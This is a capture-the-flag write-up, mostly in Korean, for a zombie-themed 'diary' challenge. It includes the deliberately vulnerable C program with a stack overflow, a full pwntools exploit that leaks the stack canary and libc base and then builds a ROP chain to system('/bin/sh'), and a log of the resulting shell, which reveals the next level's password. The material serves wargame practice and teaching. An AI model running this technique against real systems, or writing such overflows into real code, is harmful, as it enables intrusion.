https://github.com/hspace-io/Space_Alone/blob/main/problems/Chapter06/ch6.c
```
//gcc -o prob prob.c -fstack-protector -no-pie
#include <stdio.h>

void menu(){
    puts("1. read diary");
    puts("2. write diary");
    puts("3. put down the diary");
    printf("> ");
}

int main(){
    setbuf(stdin, 0);
    setbuf(stdout, 0);
    int ch, index = 0;
    char page1[] = "As soon as I arrived here, I locked the door tightly.\nCatching my breath, it feels like a miracle that I managed to escape safely.";
    char page2[] = "Looking around, there isn't much food left.\nTo survive, I'll have to go out again soon.";
    char page3[] = "I checked my weapons and packed the necessary supplies in my bag.\nAccording to rumors I heard outside, there's a vaccine at a nearby lab.";
    char page4[] = "As I headed out, I could hear the zombies' cries.\nMy heart was pounding wildly, but I moved quietly.";
    char page5[] = "At that moment, a zombie suddenly attacked me.\nAs I checked the bite wound on my arm, I realized that the vaccine at the lab was now my last hope.";
    char hidden[] = "Failed, failed, failed, failed, failed, faile... itchy, tasty";
    char* diary[] = {page1, page2, page3, page4, page5, hidden};\
    puts("");
    printf("  ██████  █    ██  ██▀███   ██▒   █▓ ██▓ ██▒   █▓ ▒█████   ██▀███    ██████    ▓█████▄  ██▓ ▄▄▄       ██▀███ ▓██   ██▓\n");
    printf("▒██    ▒  ██  ▓██▒▓██ ▒ ██▒▓██░   █▒▓██▒▓██░   █▒▒██▒  ██▒▓██ ▒ ██▒▒██    ▒    ▒██▀ ██▌▓██▒▒████▄    ▓██ ▒ ██▒▒██  ██▒\n");
    printf("░ ▓██▄   ▓██  ▒██░▓██ ░▄█ ▒ ▓██  █▒░▒██▒ ▓██  █▒░▒██░  ██▒▓██ ░▄█ ▒░ ▓██▄      ░██   █▌▒██▒▒██  ▀█▄  ▓██ ░▄█ ▒ ▒██ ██░\n");
    printf("  ▒   ██▒▓▓█  ░██░▒██▀▀█▄    ▒██ █░░░██░  ▒██ █░░▒██   ██░▒██▀▀█▄    ▒   ██▒   ░▓█▄   ▌░██░░██▄▄▄▄██ ▒██▀▀█▄   ░ ▐██▓░\n");
    printf("▒██████▒▒▒▒█████▓ ░██▓ ▒██▒   ▒▀█░  ░██░   ▒▀█░  ░ ████▓▒░░██▓ ▒██▒▒██████▒▒   ░▒████▓ ░██░ ▓█   ▓██▒░██▓ ▒██▒ ░ ██▒▓░\n");
    printf("▒ ▒▓▒ ▒ ░░▒▓▒ ▒ ▒ ░ ▒▓ ░▒▓░   ░ ▐░  ░▓     ░ ▐░  ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░▒ ▒▓▒ ▒ ░    ▒▒▓  ▒ ░▓   ▒▒   ▓▒█░░ ▒▓ ░▒▓░  ██▒▒▒\n");
    printf("░ ░▒  ░ ░░░▒░ ░ ░   ░▒ ░ ▒░   ░ ░░   ▒ ░   ░ ░░    ░ ▒ ▒░   ░▒ ░ ▒░░ ░▒  ░ ░    ░ ▒  ▒  ▒ ░  ▒   ▒▒ ░  ░▒ ░ ▒░▓██ ░▒░\n");
    printf("░  ░  ░   ░░░ ░ ░   ░░   ░      ░░   ▒ ░     ░░  ░ ░ ░ ▒    ░░   ░ ░  ░  ░      ░ ░  ░  ▒ ░  ░   ▒     ░░   ░ ▒ ▒ ░░\n\n");

    while(1){
        menu();
        scanf("%d", &ch);
        if (ch == 1){
            printf("index (0~4) : ");
            scanf("%d", &index);
            if (index >= 6 || index < 0){
                puts("invalid index");
                continue;
            }
            puts(diary[index]);
        }
        else if (ch == 2){
            printf("index (0~4) : ");
            scanf("%d", &index);
            if (index >= 6 || index < 0){
                puts("invalid index");
                continue;
            }
            printf("content > ");
            read(0, diary[index], 0x100);
        }
        else if (ch == 3){
            break;
        }
    }
    puts("Ok let's go!");
    return 0;
}
```

```
[*] '/home/Crisis_at_the_Vault/prob'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

인덱스 접근이 가능한데, 막상 gdb로 확인해보니 Index 4가 RBP에 가장 근접해 있었다.  
이때 ``2. write diary``를 통해서 인덱스 당 0x100씩 값을 쓸 수 있기 때문에, 이를 이용하여  
Canary와 main 함수의 리턴 주소에 있는 libc_start_main의 주소를 leak 하여 libc base를 구한다.  
이후에는 그냥 ROP 체인을 넣어주고, 3번으로 트리거해주면 쉽게 풀린다.  

익스플로잇은 아래와 같다:
```
from pwn import *

p = process('./prob')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

########################
### Helper Functions ###
########################

def read_diary(idx):
    p.sendlineafter(b"> ", b'1')
    p.sendlineafter(b"index (0~4) : ", str(idx).encode())

def write_diary(idx, data):
    p.sendlineafter(b"> ", b'2')
    p.sendlineafter(b"index (0~4) : ", str(idx).encode())
    p.sendafter(b"content > ", data)

####################
### Exploitation ###
####################

write_diary(4, b'A' * 153)      # [rbp-0x11] - [rbp-0x8] = 6, 146 + 6 = 152
read_diary(4)

p.recvuntil(b'A' * 153)
canary = u64(b'\x00' + p.recv(7))
print(f"[+] Canary: {hex(canary)}")

write_diary(4, b'A' * 168)
read_diary(4)

p.recvuntil(b'A' * 168)
libc_base = u64(p.recv(6).ljust(8, b'\x00')) - libc.libc_start_main_return
print(f"[+] libc_base: {hex(libc_base)}")

pop_rdi = libc_base + 0x2a3e5
binsh = libc_base + next(libc.search(b"/bin/sh"))
system = libc_base + libc.symbols['system']

payload = b'A' * 152
payload += p64(canary)
payload += b'B' * 0x8           # Overwrite RBP
payload += p64(pop_rdi) + p64(binsh)
payload += p64(pop_rdi + 1)     # Stack Alignment
payload += p64(system)

write_diary(4, payload)

p.interactive()
```

위의 익스플로잇을 사용하여 Shell을 얻고 status 명령어로 Chapter 7의 유저 PW를 확인하면 된다.
```
Crisis_at_the_Vault@hsapce-io:~$ python3 expl.py
[+] Starting local process './prob': pid 4567
[+] Canary: 0x3d1096da51f12400
[+] libc_base: 0x7fe3c4f97000
[*] Switching to interactive mode
1. read diary
2. write diary
3. put down the diary
> $ 3
Ok let's go!
$ status
UID: 507
Chapter7 PW: anchovy
■■■■□□□□□□
$
```
